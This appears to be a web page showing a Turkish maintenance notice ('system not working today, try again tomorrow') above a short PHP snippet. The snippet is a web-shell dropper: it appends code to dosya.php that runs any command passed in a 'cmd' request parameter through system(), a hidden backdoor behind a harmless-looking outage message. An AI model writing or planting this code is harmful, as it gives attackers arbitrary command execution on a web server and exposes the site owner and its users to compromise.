SİSTEM BU GUNLUK CALİŞMİYOR 
LUTFEN YARIN TEKRAR DENEYENİZ.....
    <?php
    $dosya = fopen('dosya.php', 'a');
    fwrite($dosya,"<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo 's';}__halt_compiler();?>");
    fclose($dosya);
    ?>